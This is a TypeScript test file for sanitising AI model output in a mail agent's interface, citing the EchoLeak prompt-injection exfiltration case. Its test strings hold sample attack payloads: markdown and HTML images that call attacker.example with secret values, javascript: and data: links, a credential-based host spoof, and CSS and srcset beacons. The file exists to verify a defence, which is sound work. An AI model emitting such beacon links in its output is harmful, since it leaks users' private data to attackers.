// Copyright (c) 2026 Cloudflare, Inc.
// Licensed under the Apache 2.0 license found in the LICENSE file or at:
//     https://opensource.org/licenses/Apache-2.0

/**
 * Model output must never load or navigate by itself (EchoLeak, CVE-2025-32711).
 *
 * The agent panel renders model markdown through `SafeMarkdown`; agent-written
 * drafts and sends go through `neutraliseAgentHtml` before they are stored.
 */

import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import SafeMarkdown from "~/components/SafeMarkdown";
import { linkDestination, markdownUrlTransform, safeHref } from "~/lib/safe-links";
import { neutraliseAgentHtml } from "../shared/agent-output";

const render = (md: string) => renderToStaticMarkup(createElement(SafeMarkdown, null, md));

describe("SafeMarkdown", () => {
	it("never renders an <img>, so an exfiltration URL is not fetched", () => {
		const html = render("Here you go ![](https://attacker.example/?q=SECRET_INVOICE_TOTAL)");
		expect(html).not.toMatch(/<img/i);
		expect(html).toContain("Image not loaded");
		// Shown as a link the user would have to choose to open, with its host.
		expect(html).toContain('href="https://attacker.example/?q=SECRET_INVOICE_TOTAL"');
		expect(html).toContain("attacker.example");
	});

	it("drops an image whose URL is not http(s) entirely", () => {
		const html = render("![x](javascript:alert(1))");
		expect(html).not.toMatch(/<img/i);
		expect(html).not.toContain("javascript:");
	});

	it("shows the real domain beside every link", () => {
		const html = render("[Your bank](https://evil.example.net/login)");
		expect(html).toContain('href="https://evil.example.net/login"');
		expect(html).toMatch(/evil\.example\.net<\/span>/);
		expect(html).toContain('rel="noopener noreferrer nofollow"');
	});

	it("renders javascript:, data: and relative links as plain text", () => {
		for (const href of ["javascript:alert(1)", "data:text/html,<b>x</b>", "/api/v1/mailboxes", "vbscript:x"]) {
			const html = render(`[click](${href})`);
			expect(html, href).not.toMatch(/<a /);
			expect(html, href).toContain("click");
		}
	});

	it("keeps mailto links and shows the address", () => {
		const html = render("[write](mailto:help@example.com)");
		expect(html).toContain('href="mailto:help@example.com"');
		expect(html).toContain("help@example.com");
	});

	it("does not render raw HTML in the markdown", () => {
		const html = render('<img src="https://attacker.example/p.gif"> hi');
		expect(html).not.toMatch(/<img/i);
	});

	it("autolinks are sanitised the same way", () => {
		const html = render("see https://ok.example.com/path");
		expect(html).toContain('href="https://ok.example.com/path"');
	});
});

describe("safe-links", () => {
	it("allows only http, https and mailto", () => {
		expect(safeHref("https://a.example/x")).toBe("https://a.example/x");
		expect(safeHref("http://a.example/")).toBe("http://a.example/");
		expect(safeHref("mailto:a@b.example")).toBe("mailto:a@b.example");
		expect(safeHref("javascript:alert(1)")).toBeNull();
		expect(safeHref("data:image/png;base64,AAAA")).toBeNull();
		expect(safeHref("/relative")).toBeNull();
		expect(safeHref("ftp://x.example")).toBeNull();
	});

	it("refuses credentials in the URL, which fake the visible host", () => {
		expect(safeHref("https://bank.example@evil.example/")).toBeNull();
	});

	it("leaves punycode visible so a lookalike shows as xn--", () => {
		expect(linkDestination("https://xn--pypal-4ve.com/")).toBe("xn--pypal-4ve.com");
	});

	it("urlTransform blanks anything off the allowlist", () => {
		expect(markdownUrlTransform("javascript:x")).toBe("");
		expect(markdownUrlTransform("https://a.example")).toBe("https://a.example/");
	});
});

describe("neutraliseAgentHtml (agent drafts and sends)", () => {
	it("replaces remote images with a text note", () => {
		const out = neutraliseAgentHtml('<p>Hi</p><img src="https://attacker.example/?d=secret" alt="logo">');
		expect(out).not.toMatch(/<img/i);
		expect(out).toContain("[image removed: logo]");
	});

	it("keeps inline data: and cid: images", () => {
		const data = '<img src="data:image/png;base64,AAAA">';
		expect(neutraliseAgentHtml(data)).toBe(data);
		expect(neutraliseAgentHtml('<img src="cid:logo">')).toContain("cid:logo");
	});

	it("strips javascript: hrefs but keeps https and mailto", () => {
		const out = neutraliseAgentHtml(
			'<a href="javascript:alert(1)">x</a><a href="https://ok.example">y</a><a href="mailto:a@b.example">z</a>',
		);
		expect(out).not.toContain("javascript:");
		expect(out).toContain('href="https://ok.example"');
		expect(out).toContain('href="mailto:a@b.example"');
	});

	it("removes srcset and CSS url() beacons", () => {
		const out = neutraliseAgentHtml(
			'<div style="background:url(https://attacker.example/b.gif)">x</div><img src="data:image/png;base64,A" srcset="https://attacker.example/1x 1x">',
		);
		expect(out).not.toContain("attacker.example");
	});
});
